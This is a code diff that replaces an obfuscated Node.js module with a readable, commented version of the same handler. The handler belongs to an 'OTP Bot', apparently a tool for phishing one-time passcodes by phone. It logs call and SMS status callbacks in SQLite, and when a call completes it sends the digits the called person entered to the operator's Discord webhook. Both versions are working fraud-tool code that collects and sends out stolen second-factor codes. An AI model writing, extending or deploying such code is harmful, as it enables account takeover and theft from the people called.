@@ -1,1 +1,114 @@
-function _0x58bf(){var _0xa1ced1=['14iWDoAi','From','run','\x20text\x20FROM\x20','UPDATE\x20','6TXPzhX','***','**\x0a','digits','||\x0a','INSERT\x20INTO\x20','\x0a:white_check_mark:\x20\x20OTP\x20:\x20||','get','\x20=\x20?','8yZiFHS','.././config','All\x20is\x20alright.','CallStatus','log','setTimestamp','\x0aStatus:\x20**','86340uiXxTL','discord-webhook-node','calls','2834962uudnZY','user','sms','25jlAYXD','./db/data.db','11eJaztu','SmsSid','callSid','\x20SET\x20status\x20=\x20?,\x20itsfrom\x20=\x20?,\x20itsto\x20=\x20?,\x20date\x20=\x20?\x20WHERE\x20','Database','7622951bkSjvc','sqlite3','setTitle','slice','json','SmsStatus','setFooter','send','963wMRUpt','OTP\x20Bot','Please\x20send\x20all\x20the\x20needed\x20post\x20data.','verbose','smssid','4rLpVXZ','15158332','discordwebhook','error','\x20WHERE\x20',',\x20date)\x20VALUES(?,\x20?,\x20?,\x20?,\x20?)','status','message','2017176EHppES','576480SaPgpp','setDescription','46048SJaZpz','SELECT\x20','now','body','\x0a:x:\x20The\x20user\x20didn\x27t\x20respond\x20or\x20enter\x20the\x20code.\x0a','exports','12312048tHUJDg'];_0x58bf=function(){return _0xa1ced1;};return _0x58bf();}function _0x5efd(_0x194e0d,_0x1631ab){var _0x58bf80=_0x58bf();return _0x5efd=function(_0x5efd64,_0x592c29){_0x5efd64=_0x5efd64-0x107;var _0x1929dc=_0x58bf80[_0x5efd64];return _0x1929dc;},_0x5efd(_0x194e0d,_0x1631ab);}var _0x518819=_0x5efd;(function(_0x48992b,_0x56f3dc){var _0x4d10a9=_0x5efd,_0x1ffaf7=_0x48992b();while(!![]){try{var _0x1a5451=parseInt(_0x4d10a9(0x133))/0x1*(-parseInt(_0x4d10a9(0x13e))/0x2)+parseInt(_0x4d10a9(0x109))/0x3*(-parseInt(_0x4d10a9(0x13b))/0x4)+-parseInt(_0x4d10a9(0x11f))/0x5*(-parseInt(_0x4d10a9(0x13c))/0x6)+parseInt(_0x4d10a9(0x126))/0x7*(parseInt(_0x4d10a9(0x112))/0x8)+parseInt(_0x4d10a9(0x12e))/0x9*(parseInt(_0x4d10a9(0x119))/0xa)+-parseInt(_0x4d10a9(0x121))/0xb*(parseInt(_0x4d10a9(0x144))/0xc)+parseInt(_0x4d10a9(0x11c))/0xd*(parseInt(_0x4d10a9(0x145))/0xe);if(_0x1a5451===_0x56f3dc)break;else _0x1ffaf7['push'](_0x1ffaf7['shift']());}catch(_0x4014a0){_0x1ffaf7['push'](_0x1ffaf7['shift']());}}}(_0x58bf,0x8eba9),module[_0x518819(0x143)]=function(_0x22e1cf,_0x53460b){var _0x54c873=_0x518819;const _0x434dfb=require(_0x54c873(0x113)),{Webhook:_0x5bfb8d,MessageBuilder:_0x1dd497}=require(_0x54c873(0x11a)),_0x214371=new _0x5bfb8d(_0x434dfb[_0x54c873(0x135)]||''),_0x356600=require(_0x54c873(0x127))[_0x54c873(0x131)](),_0x421f21=new _0x356600[(_0x54c873(0x125))](_0x54c873(0x120));var _0x4f49a2=_0x22e1cf[_0x54c873(0x141)][_0x54c873(0x146)]||null,_0x4ca021=_0x22e1cf[_0x54c873(0x141)]['To']||null,_0x4c1011=_0x22e1cf['body']['CallSid'],_0x102889=Date[_0x54c873(0x140)](),_0x448d40,_0x240736=null,_0x45afff=null;_0x4c1011!=undefined?(_0x448d40=_0x22e1cf['body'][_0x54c873(0x115)],_0x240736=_0x54c873(0x11b),_0x45afff=_0x54c873(0x123)):(_0x4c1011=_0x22e1cf[_0x54c873(0x141)][_0x54c873(0x122)],_0x448d40=_0x22e1cf['body'][_0x54c873(0x12b)],_0x240736=_0x54c873(0x11e),_0x45afff=_0x54c873(0x132));if(_0x4f49a2==null||_0x4ca021==null||_0x4c1011==undefined||_0x4c1011==null)return _0x53460b[_0x54c873(0x139)](0xc8)[_0x54c873(0x12a)]({'error':_0x54c873(0x130)});_0x421f21[_0x54c873(0x110)](_0x54c873(0x13f)+_0x45afff+_0x54c873(0x107)+_0x240736+_0x54c873(0x137)+_0x45afff+_0x54c873(0x111),[_0x4c1011],(_0x41f7d1,_0x302c86)=>{var _0x42b7c2=_0x54c873;if(_0x41f7d1)return console[_0x42b7c2(0x116)](_0x41f7d1[_0x42b7c2(0x13a)]);_0x302c86==undefined?_0x421f21[_0x42b7c2(0x147)](_0x42b7c2(0x10e)+_0x240736+'(itsfrom,\x20itsto,\x20status,\x20'+_0x45afff+_0x42b7c2(0x138),[_0x4f49a2,_0x4ca021,_0x448d40,_0x4c1011,_0x102889],function(_0x4ea0b1){var _0x3e4615=_0x42b7c2;if(_0x4ea0b1)return console[_0x3e4615(0x116)](_0x4ea0b1[_0x3e4615(0x13a)]);return _0x53460b[_0x3e4615(0x139)](0xc8)['json']({'inserted':'All\x20is\x20alright.'});}):_0x421f21[_0x42b7c2(0x147)](_0x42b7c2(0x108)+_0x240736+_0x42b7c2(0x124)+_0x45afff+'\x20=\x20?',[_0x448d40,_0x4f49a2,_0x4ca021,_0x102889,_0x4c1011],function(_0x373227){var _0x5f13e8=_0x42b7c2;if(_0x373227)return console[_0x5f13e8(0x116)](_0x373227[_0x5f13e8(0x13a)]);return _0x240736==_0x5f13e8(0x11b)&&_0x448d40=='completed'&&_0x434dfb[_0x5f13e8(0x135)]!=undefined?_0x421f21[_0x5f13e8(0x110)]('SELECT\x20*\x20FROM\x20calls\x20WHERE\x20callSid\x20\x20=\x20?',[_0x4c1011],(_0x5d5889,_0x9e0e12)=>{var _0x250486=_0x5f13e8;if(_0x5d5889)return console['error'](_0x5d5889[_0x250486(0x13a)]);var _0x5c8a3a;if(_0x9e0e12['digits']==''||_0x9e0e12['digits']==undefined)_0x5c8a3a=new _0x1dd497()['setTitle'](_0x250486(0x12f))['setColor'](_0x250486(0x134))[_0x250486(0x13d)](_0x250486(0x142))[_0x250486(0x12c)](_0x9e0e12[_0x250486(0x11d)])['setTimestamp']();else{if(_0x9e0e12[_0x250486(0x11d)]=='test')_0x9e0e12['digits']=_0x9e0e12[_0x250486(0x10c)][_0x250486(0x129)](0x0,0x3)+_0x250486(0x10a);_0x5c8a3a=new _0x1dd497()[_0x250486(0x128)](_0x250486(0x12f))['setColor'](_0x250486(0x134))[_0x250486(0x13d)](_0x250486(0x10f)+_0x9e0e12[_0x250486(0x10c)]+_0x250486(0x10d))[_0x250486(0x12c)](_0x9e0e12[_0x250486(0x11d)])[_0x250486(0x117)]();}_0x214371['send'](_0x5c8a3a);}):_0x421f21[_0x5f13e8(0x110)]('SELECT\x20*\x20FROM\x20calls\x20WHERE\x20callSid\x20\x20=\x20?',[_0x4c1011],(_0x4e066e,_0x1f8c28)=>{var _0xd79bb3=_0x5f13e8;if(_0x4e066e)return console[_0xd79bb3(0x136)](_0x4e066e[_0xd79bb3(0x13a)]);var _0x7d36ca;_0x7d36ca=new _0x1dd497()[_0xd79bb3(0x128)](_0xd79bb3(0x12f))['setColor'](_0xd79bb3(0x134))[_0xd79bb3(0x13d)](_0xd79bb3(0x118)+_0x448d40+_0xd79bb3(0x10b))[_0xd79bb3(0x12c)](_0x1f8c28[_0xd79bb3(0x11d)])[_0xd79bb3(0x117)](),_0x214371[_0xd79bb3(0x12d)](_0x7d36ca);}),_0x53460b['status'](0xc8)['json']({'inserted':_0x5f13e8(0x114)});});});});
+module.exports = function (req, res) {
+  // Import the configuration file.
+  const config = require("../config");
+  
+  // Import the required classes from discord-webhook-node module.
+  const { Webhook, MessageBuilder } = require("discord-webhook-node");
+  
+  // Create a new Webhook object using the Discord webhook URL from the config.
+  const discordWebhook = new Webhook(config.discordwebhook || "");
+  
+  // Import the sqlite3 module and enable verbose mode for detailed error messages.
+  const sqlite3 = require("sqlite3").verbose();
+  
+  // Create a new database object pointing to the specified database file.
+  const db = new sqlite3.Database("./db/data.db");
+  
+  // Extract the required parameters from the request body.
+  const from = req.body.From || null;
+  const to = req.body.To || null;
+  let sid = req.body.CallSid;
+  const timestamp = Date.now();
+  let status, table, sidColumn;
+
+  // Determine if the request is for a call or SMS.
+  if (sid != undefined) {
+    status = req.body.CallStatus;
+    table = "calls";
+    sidColumn = "callSid";
+  } else {
+    sid = req.body.SmsSid;
+    status = req.body.SmsStatus;
+    table = "sms";
+    sidColumn = "smssid";
+  }
+
+  // Check if all required parameters are provided.
+  if (from == null || to == null || sid == undefined || sid == null) {
+    return res.status(200).json({
+      error: "Please send all the needed post data."
+    });
+  }
+
+  // Query the database to check if the sid exists.
+  db.get(`SELECT ${sidColumn} FROM ${table} WHERE ${sidColumn} = ?`, [sid], (err, row) => {
+    if (err) {
+      return console.log(err.message);
+    }
+
+    if (row == undefined) {
+      // If the sid does not exist, insert a new record.
+      db.run(`INSERT INTO ${table} (itsfrom, itsto, status, ${sidColumn}, date) VALUES (?, ?, ?, ?, ?)`, [from, to, status, sid, timestamp], function (err) {
+        if (err) {
+          return console.log(err.message);
+        }
+        return res.status(200).json({
+          inserted: "All is alright."
+        });
+      });
+    } else {
+      // If the sid exists, update the existing record.
+      db.run(`UPDATE ${table} SET status = ?, itsfrom = ?, itsto = ?, date = ? WHERE ${sidColumn} = ?`, [status, from, to, timestamp, sid], function (err) {
+        if (err) {
+          return console.log(err.message);
+        }
+
+        if (table == "calls" && status == "completed" && config.discordwebhook != undefined) {
+          // If the call is completed, send a notification to the Discord webhook.
+          db.get("SELECT * FROM calls WHERE callSid = ?", [sid], (err, callDetails) => {
+            if (err) {
+              return console.error(err.message);
+            }
+            let message;
+            if (callDetails.digits == "" || callDetails.digits == undefined) {
+              message = new MessageBuilder()
+                .setTitle("OTP Bot")
+                .setColor("15158332")
+                .setDescription("\n:x: The user didn't respond or enter the code.\n")
+                .setFooter(callDetails.user)
+                .setTimestamp();
+            } else {
+              if (callDetails.user == "test") {
+                callDetails.digits = callDetails.digits.slice(0, 3) + "***";
+              }
+              message = new MessageBuilder()
+                .setTitle("OTP Bot")
+                .setColor("15158332")
+                .setDescription("\n:white_check_mark:  OTP : ||" + callDetails.digits + "||\n")
+                .setFooter(callDetails.user)
+                .setTimestamp();
+            }
+            discordWebhook.send(message);
+          });
+        } else {
+          // If the call is not completed, send a status update to the Discord webhook.
+          db.get("SELECT * FROM calls WHERE callSid = ?", [sid], (err, callDetails) => {
+            if (err) {
+              return console.error(err.message);
+            }
+            const message = new MessageBuilder()
+              .setTitle("OTP Bot")
+              .setColor("15158332")
+              .setDescription(`\nStatus: **${status}**\n`)
+              .setFooter(callDetails.user)
+              .setTimestamp();
+            discordWebhook.send(message);
+          });
+        }
+        return res.status(200).json({
+          inserted: "All is alright."
+        });
+      });
+    }
+  });
+};
